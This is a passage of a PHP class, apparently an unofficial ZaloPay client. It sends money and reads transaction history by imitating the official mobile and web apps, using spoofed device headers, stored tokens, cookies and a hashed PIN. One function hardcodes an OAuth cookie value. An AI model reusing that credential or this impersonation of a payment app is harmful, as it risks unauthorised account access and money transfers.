            'Host: zalopay.com.vn',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://zalopay.com.vn/um/getuserprofilesimpleinfo?userid=$user_id&accesstoken=$access_token&platform=android&deviceid=$device_id&devicemodel=Vsmart%20Live%204&osver=Android%2030%20%2811%29&appversion=7.10.0&sdkver=2.0.0&distsrc=&mno=Viettel&conntype=WIFI&issecure=true");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);

        curl_close($ch);
        return $data;
    }

    public function get_info($phone)
    {
        $headers = array(
            'Host: zalopay.com.vn',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://zalopay.com.vn/um/getuserinfobyphonev2?userid=' . urlencode($this->config['user_id']) . '&accesstoken=' . urlencode($this->config['access_token']) . '&phonenumber=' . $phone . '&platform=android&deviceid=' . urlencode($this->config['deviceid']) . '&devicemodel=Vsmart%20Live%204&osver=Android%2030%20%2811%29&appversion=7.10.0&sdkver=2.0.0&distsrc=&mno=Viettel&conntype=WIFI&issecure=true');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    

    public function income_outcome($month, $year)
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'X-Drsite: off',
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPayWebClient/8.3.0',
            'X-Device-Model: iPhone11,6',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.3',
            'X-Density: iphone3x',
            'X-Platform: ZPA',
            'X-App-Version: 8.3.0',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN,vi;q=0.9',
            'Sessionid: ' . $this->config['session_id'],
            'Accept: */*',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/history/income-outcome?days=5&months=' . $month . '&year=' . $year);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function income_outcome_web($month, $year)
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/history/income-outcome?days=5&months=' . $month . '&year=' . $year);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function Order_Money($info, $msg, $amount = 0)
    {
        $data = array(
            "receiver_zalopay_id" => $info['userid'],
            "zalo_token" => $this->config['access_token'],
            "media" => array(
                "greeting_card" => array(
                    "theme_id" => "1",
                ),
            ),
            "receiver_avatar" => $info['avatar'],
            "receiver_name" => $info['displayname'],
            "note" => $msg,
            "receiver_zalo_id" => "",
            "amount" => $amount,
        );
        // print_r($data); die;
        $headers = array(
            'Host: sapi.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPay Android / 9464',
            'X-Device-Model: iPhone11,6',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.3',
            'X-Density: iphone3x',
            'X-App-Version: 8.2.1',
            'X-Platform: ZPA,iOS',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN;q=1.0',
            'Sessionid: ' . $this->config['access_token'],
            'Accept: */*',
        );
        return $this->CURL('https://sapi.zalopay.vn/mt/v5/create-order-v2', $headers, $data);
    }

    public function Get_assets($info)
    {
        $data = array(
            "display_mode" => 2,
            "appversion" => "8.13.0",
            "devicemodel" => "iPhone10,2",
            "carriername" => "Mobifone",
            "mno" => "45201",
            "conntype" => "wifi",
            "full_assets" => true,
            "platform" => "ios",
            "app_version" => "8.13.0",
            "userid" => $this->config['user_id'],
            "order_type" => "ORDER_TOKEN",
            "token_data" => array(
                "order_token" => $info['data']['order_token'],
            ),
            "osver" => "15.4.1",
            "frontendid" => "1",
            "sessionid" => $this->config['access_token'],
            "issecure" => "true",
            "accesstoken" => $this->config['access_token'],
            "deviceid" => $this->config['deviceid'],
            "mnoupdated" => "452_01",
        );
        $headers = array(
            'Host: api.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPay Android / 9464',
            'X-Device-Model: iPhone11,6',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.3',
            'X-Density: iphone3x',
            'X-App-Version: 8.2.1',
            'X-Platform: ZPA',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN,vi;q=0.9',
            'Sessionid: ' . $this->config['access_token'],
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded',
        );
        return $this->CURL('https://api.zalopay.vn/v2/cashier/assets', $headers, $data);
    }

    public function Pay_Money($info)
    {
        $data = array(
            "order_token" => $info['data']['order_token'],
            "devicemodel" => "iPhone11,6",
            "sessionid" => $this->config['session_id'],
            "conntype" => "wifi",
            "zalo_token" => "",
            "frontendid" => "1",
            "order_source" => 0,
            "authenticator" => array(
                "authen_type" => 1,
                "pin" => hash("sha256", $this->config['password']),
            ),
            "issecure" => "true",
            "osver" => "16.3",
            "platform" => "ios",
            "userid" => $this->config['user_id'],
            "sof_token" => $info['data']['source_of_fund']['sof_token'],
            "appversion" => "8.2.1",
            "accesstoken" => $this->config['access_token'],
            "promotion_token" => "",
            "deviceid" => $this->config['deviceid'],

        );
        $headers = array(
            'Host: api.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPay Android / 9464',
            'X-Device-Model: iPhone11,6',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.3',
            'X-Density: iphone3x',
            'X-App-Version: 8.2.1',
            'X-Platform: ZPA',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN,vi;q=0.9',
            'Sessionid: ' . $this->config['session_id'],
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded',
        );
        return $this->CURL('https://api.zalopay.vn/v2/cashier/pay', $headers, $data);
    }

    public function PRE_CHECK_STATUS()
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'X-Drsite: off',
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPayWebClient/8.3.0',
            'X-Device-Model: iPhone11,6',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.3',
            'X-Density: iphone3x',
            'X-Platform: ZPA',
            'X-App-Version: 8.3.0',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN,vi;q=0.9',
            'Sessionid: ' . $this->config['session_id'],
            'Accept: */*',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.zalopay.vn/v2/cashier/pre-check?');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function get_order_status($info)
    {
        $headers = array(

            'Host: mte.zalopay.vn',
            'Cookie: X-DRSITE=off',
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded',
            'X-Drsite: off',
            'User-Agent: ZaloPay/8.2.1 (' . $_SERVER['HTTP_USER_AGENT'] . ')',
            'Accept-Language: vi-VN;q=1',
            'Connection: close',
        );
        $data = array(
            'accesstoken' => $this->config['access_token'],
            'appid' => '450',
            'apptransid' => $info['data']['zp_trans_id'],
            'appversion' => '8.2.1',
            'conntype' => 'wifi',
            'deviceid' => $this->config['deviceid'],
            'devicemodel' => 'iPhone11,6',
            'frontendid' => '1',
            'issecure' => true,
            'osver' => '16.3',
            'platform' => 'ios',
            'sessionid' => $this->config['session_id'],
            'userid' => $this->config['user_id'],

        );
        return $this->CURL('https://mte.zalopay.vn/transfer-gateway/get-order-status', $headers, $data);
    }

    public function Status_send_money($info)
    {
        $headers = array(
            'Host: api.zalopay.vn',
            'X-Zalopay-Id: ' . $this->config['user_id'],
            'X-Drsite: off',
            'user-agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' ZaloPayWebClient/8.3.0',
            'X-Device-Model: iPhone11,6',
            'X-Access-Token: ' . $this->config['access_token'],
            'X-Device-Id: ' . $this->config['deviceid'],
            'X-Device-Os: IOS',
            'X-Os-Version: 16.3',
            'X-Density: iphone3x',
            'X-Platform: ZPA',
            'X-App-Version: 8.3.0',
            'X-Zalo-Id: ' . $this->config['zalo_id'],
            'Authorization: Bearer ' . $this->config['access_token'],
            'Accept-Language: vi-VN,vi;q=0.9',
            'Sessionid: ' . $this->config['session_id'],
            'Accept: */*',
        );
        $data = array(
            "devicemodel" => "iPhone10,2",
            "mno" => "45201",
            "platform" => "ios",
            "conntype" => "wifi",
            "carriername" => "Mobifone",
            "deviceid" => $this->config['deviceid'],
            "frontendid" => "1",
            "osver" => "15.4.1",
            "userid" => $this->config['user_id'],
            "appversion" => "8.13.0",
            "sessionid" => $this->config['access_token'],
            "mnoupdated" => "452_01",
            "accesstoken" => $this->config['access_token'],
            "order_token" => $info['data']['order_token'],
            "issecure" => "true",
        );
        return $this->CURL('https://api.zalopay.vn/v2/cashier/order/status', $headers, $data);
    }

    public function SendMoney($phone, $msg, $amount)
    {
        // check name
        $check_info = $this->get_info($phone);
        if ($check_info['returncode'] != 1) {
            return array(
                'status' => 'error',
                'type' => 'info',
                'message' => $check_info['data'],
            );
        }
        // order
        $result = $this->Order_Money($check_info, $msg, $amount);
        if (empty($result)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Lỗi Dữ Liệu Chuyển Tiền',
            );
        }
        if (empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Tạo Đơn Chuyển Tiền',
            );
        }
        // get dữ liệu chuyển tiền
        $result2 = $this->Get_assets($result);
        if (empty($result2) || empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Lấy Thông Tin Chuyển Tiền',
            );
        }
        $sof_token = $result2['data']['source_of_fund']['sof_token'];
        $message = $result2['data']['source_of_fund']['message'];
        $balance = $result2['data']['source_of_fund']['balance'];
        // check số dư
        if ($balance < $amount) {
            return array(
                'status' => 'error',
                'type' => 'not_money',
                'message' => 'Số Dư Không Đủ',
            );
        }
        // chuyển tiền
        $send = $this->Pay_Money($result2);
        // print_r($send);
        if (empty($send)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Chuyển Tiền',
            );
        }
        if (isset($send['data']) && $send['data']['is_processing'] == 1) {
            // get mã giao dịch
            for ($i = 0; $i < 50; $i++) {
                $status_gd = $this->Status_send_money($send);
                // print_r($status_gd);
                if (!empty($status_gd['error'])) {
                    if ($status_gd['error']['code'] == 9) {
                        return array(
                            'status' => 'error',
                            'type' => 'max',
                            'message' => $status_gd['error']['details']['localized_message']['message'],
                        );
                    } else {
                        return array(
                            'status' => 'error',
                            'type' => 'error',
                            'message' => $status_gd['error']['details']['localized_message']['message'],
                        );
                    }
                } else if ($status_gd['data']['order_status'] != 2) {
                    break;
                }
            }
            if ($status_gd['data']['order_status'] == 7 || !empty($status_gd['data']['zp_trans_id'])) {
                $check_status = $this->GET_TRANS_BY_TID($status_gd['data']['zp_trans_id']);
                // header("Content-type:text/json");
                // echo json_encode($check_status, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
                if (empty($check_status['error'])) {
                    $data_check = $check_status["data"]['transaction'];
                    if ($data_check['status_info']['status'] == 3) {
                        $title = $data_check['status_info']['title'];
                        $message = $data_check['status_info']['message'];
                        return array(
                            'status' => 'error',
                            'type' => 'max',
                            'message' => $message,
                        );
                    }
                }
                return array(
                    'status' => 'success',
                    'message' => 'Chuyển Tiền Thành Công',
                    'data' => array(
                        'trans_id' => $check_status["data"]['transaction']['trans_id'],
                        'zp_trans_id' => $status_gd['data']['zp_trans_id'],
                        'partner_name' => $check_info['displayname'],
                        'partner_id' => $check_info['userid'],
                        'avatar' => $check_info['avatar'],
                        'amount' => $amount,
                        'comment' => $msg,
                        'owner_phone' => $this->config['phone'],
                        'owner_name' => $this->config['name'],
                        'order_token' => $send['data']['order_token'],
                    ),
                );
            } else {
                return array(
                    'status' => 'error',
                    'type' => 'error',
                    'message' => 'Lỗi Không Xác Định',
                );
            }
        } else {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Chuyển Tiền Thất Bại',
            );
        }
    }



    // ==============================[ chuyển tiền trên web ]==============================
    public function get_info_web($phone)
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'Referer: https://social.zalopay.vn/spa/v2/home-transfer?from_source=home_zalopay',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/ibft/web/get-user-info?phone=84'.substr($phone, 1, 9));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        // echo $data;
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function Get_zalo_access_token()
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/zalo/access-token');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function Get_token_sendmoney($data_zalo_token)
    {
        $headers = array(
            'Host: graph.zalo.me',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://graph.zalo.me/v2.0/ottoken?access_token='.$data_zalo_token['data']['zalo_access_token']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function Order_Money_web($info, $data_token, $msg, $amount = 0)
    {
        $data = array(
            "receiver_zalopay_id" => "",
            "receiver_zalo_id" => "",
            "receiver_name" => $info['data']['name'],
            "receiver_avatar" => $info['data']['avatar'],
            "amount" => $amount,
            "note" => $msg,
            "zalo_token" => $data_token['token'],
            "media" => array(
                "greeting_card" => array(
                    "theme_id" => "133"
                )
            ),
            "utoken" => "",
            "zpp" => urldecode($info['data']['zpp']),
        );
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        return $this->CURL('https://sapi.zalopay.vn/mt/v5/create-order-v2', $headers, $data);
    }

    public function Get_assets_web($info)
    {
        $data = json_encode(array(
            "display_mode" => 1,
            "token_data" => array(
                "order_token" => $info['data']['order_token'],
            ),
            "full_assets" => true,
            "order_data" => (object)array(),
            "order_type" => 3,
        ));
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Accept:*/*',
            'Cookie: ' . $this->config['cookie'],
            'Content-Length:'.strlen($data),
            'Accept-Language:en-US,en;q=0.9',
            'Connection:keep-alive',
            'Content-Type:text/plain;charset=UTF-8',
            'Host:sapi.zalopay.vn',
            'Origin:https://social.zalopay.vn',
            'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/cashier/assets');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        curl_close($ch);
        $access = json_decode($result, true);
        return $access;
    }

    public function Pay_Money_web($info)
    {
        $data = json_encode(array(
            "authenticator" => array(
                "authen_type" => 1,
                "pin" => hash("sha256", $this->config['password']),
            ),
            "order_fee" => [0],
            "order_token" => $info['data']['order_token'],
            "promotion_token" => "",
            "service_id" => 19,
            "sof_token" => $info['data']['source_of_fund']['sof_token'],
            "user_fee" => [0],
            "zalo_token" => "",
            "callback_url" => "zalo => //qr/jp/nibvlsoj2j?cb_t=dotp&k=".time()."&otp=",
            "card" => null,
            "is_zmp" => false
        ));
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Accept:*/*',
            'Cookie: ' . $this->config['cookie'],
            'Content-Length:'.strlen($data),
            'Accept-Language:en-US,en;q=0.9',
            'Connection:keep-alive',
            'Content-Type:text/plain;charset=UTF-8',
            'Host:sapi.zalopay.vn',
            'Origin:https://social.zalopay.vn',
            'User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/cashier/pay');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        curl_close($ch);
        $access = json_decode($result, true);
        return $access;
    }

    public function Status_send_money_web($info, $sof_token)
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/cashier/result?zp_trans_id='.$info['data']['zp_trans_id_encode'].'&order_token='.$info['data']['order_token'].'&sof_token='.$sof_token);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function GET_TRANS_BY_TID($ID)
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'x-device-os: ANDROID',
            'x-platform" ZPA',
            'authorization: Bearer ' . $this->config['access_token'] . '',
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://sapi.zalopay.vn/v2/history/transactions/$ID?type=1");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function GET_TRANS_BY_TID_WEB($app_trans_id)
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            // 'Referer: https://social.zalopay.vn/spa/v2/history',
            'X-Platform: ZPA',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language: vi-VN,vi;q=0.9',
        );
        $ch = curl_init();
        // echo 'https://sapi.zalopay.vn/v2/history/transactions/'.$app_trans_id.'?type=1';
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/history/transactions/'.$app_trans_id.'?type=1');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function SendMoney_web($phone, $msg, $amount)
    {
        // check name
        $check_info = $this->get_info_web($phone);
        if (empty($check_info['data'])) {
            return array(
                'status' => 'error',
                'type' => 'info',
                'message' => $check_info['error']['details']['localized_message']['message'],
            );
        }
        // get zalo access_token
        $data_zalo_token =  $this->Get_zalo_access_token();
        $data_token = $this->Get_token_sendmoney($data_zalo_token);
        $result = $this->Order_Money_web($check_info, $data_token, $msg, $amount);
        $order_no = $result['data']['order_no'];
        if (empty($result)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Lỗi Dữ Liệu Chuyển Tiền',
            );
        }
        if (empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Tạo Đơn Chuyển Tiền',
            );
        }
        // get dữ liệu chuyển tiền
        $result2 = $this->Get_assets_web($result);
        // print_r($result2); die;
        if (empty($result2) || empty($result['data'])) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Lấy Thông Tin Chuyển Tiền',
            );
        }
        $sof_token = $result2['data']['source_of_fund']['sof_token'];
        $message = $result2['data']['source_of_fund']['message'];
        $balance = $result2['data']['source_of_fund']['balance'];
        // check số dư
        if ($balance < $amount) {
            return array(
                'status' => 'error',
                'type' => 'not_money',
                'message' => 'Số Dư Không Đủ',
            );
        }
        // chuyển tiền
        $send = $this->Pay_Money_web($result2);
        // print_r($send); die;
        if (empty($send)) {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Không Thể Chuyển Tiền',
            );
        }
        
        if (isset($send['data']) && $send['data']['is_processing'] == 1) {
            for ($i = 0; $i < 20; $i++) {
                $get_trans_id = $this->getHistoryV2(1, '');
                $check_status = $this->GET_TRANS_BY_TID_WEB(json_decode($get_trans_id, true)["data"]['transactions'][0]['trans_id']);
                if ($check_status['data']['transaction']['app_trans_id'] == $order_no) {
                    break;
                }
            }
            // check max gd
            if (empty($check_status['error'])) {
                $data_check = $check_status["data"]['transaction'];
                if ($data_check['status_info']['status'] == 3) {
                    $title = $data_check['status_info']['title'];
                    $message = $data_check['status_info']['message'];
                    return array(
                        'status' => 'error',
                        'type' => 'max',
                        'message' => $message,
                    );
                }
            }
            return array(
                'status' => 'success',
                'message' => 'Chuyển Tiền Thành Công',
                'data' => array(
                    'trans_id' => $check_status["data"]['transaction']['trans_id'],
                    'zp_trans_id' => $check_status['data']['transaction']['app_trans_id'],
                    'partner_name' => $check_info['data']['name'],
                    'partner_id' => $check_info['data']['zalopay_id'],
                    'avatar' => $check_info['data']['avatar'],
                    'amount' => $amount,
                    'comment' => $msg,
                    'owner_phone' => $this->config['phone'],
                    'owner_name' => $this->config['name'],
                    'order_token' => $send['data']['order_token'],
                ),
            );
        } else {
            return array(
                'status' => 'error',
                'type' => 'error',
                'message' => 'Chuyển Tiền Thất Bại',
            );
        }
    }

    // ================================[ Chuyển tiền lại ]=================================================
    public function zalo_access_token($trans_id)
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: has_device_id=1; zpt=' . $this->config['access_token'] . '; abt=on; zalo_id=' . $this->config['zalo_id'] . '; zalo_oauth=AqRk_QXwgNjBQecoXdpxSd9NlxB1M-vzDLN9jP9DqWGZHu6nzLQbUpX7de3DKT56Vbw5ZerJc0qHJB-wfKFW3d1KnSU_GPueGcFc_SfGjpGsGf36dsIpT39lvC18RkKZ-YBagcfiyt3KVwEeE2hZ0z1GbxXpAg1ejOkxWMhdaq6dyxg4S_pw4DwhZ_CKtlqpXVd2dqEPeXJGtuwHJhQH4EgzmTq0iFylieJ6v7dfx2spIDV92mxFGfW5cVfyMf1ktKcnc1zib22y3vB9DGxhVPa2fQrb4hDKv7kxoKqYX6QZKVsIG6UHMySevjLPRFWQqo2FpySStpKZ9CxRbN3LMo9fkz_4J8idUsFmpwT6XUzEX8OtZBYMMXMLEzgMh5n-8SqRfflACcCpjXsmxQ4qO6QqTFAXzqOt1fm4vbvP9cy4_tEeNFzz; zalopay_id=' . $this->config['user_id'] . '; zlp_token=' . $this->config['access_token'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Zalo iOS/502 ZaloTheme/light ZaloLanguage/vn',
            'Accept-Language: vi-VN,vi;q=0.9',
            'Referer: https://social.zalopay.vn/spa/v2/transfer?app_trans_id=' . $trans_id,
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/v2/zalo/access-token');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function info_by_tarns_id($trans_id)
    {
        $headers = array(
            'Host: sapi.zalopay.vn',
            'Cookie: ' . $this->config['cookie'],
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Zalo iOS/502 ZaloTheme/light ZaloLanguage/vn',
            'Accept-Language: vi-VN,vi;q=0.9',
            'Referer: https://social.zalopay.vn/spa/v2/transfer?app_trans_id=' . $trans_id,
        );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://sapi.zalopay.vn/mt/v5/order/' . $trans_id . '?page=result');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $data = curl_exec($ch);
        $json = json_decode($data, true);
        curl_close($ch);
        return $json;
    }

    public function ottoken($zalo_access_token)
    {
        $headers = array(
            'Host: graph.zalo.me',
            'Accept: */*',
            'Origin: https://social.zalopay.vn',
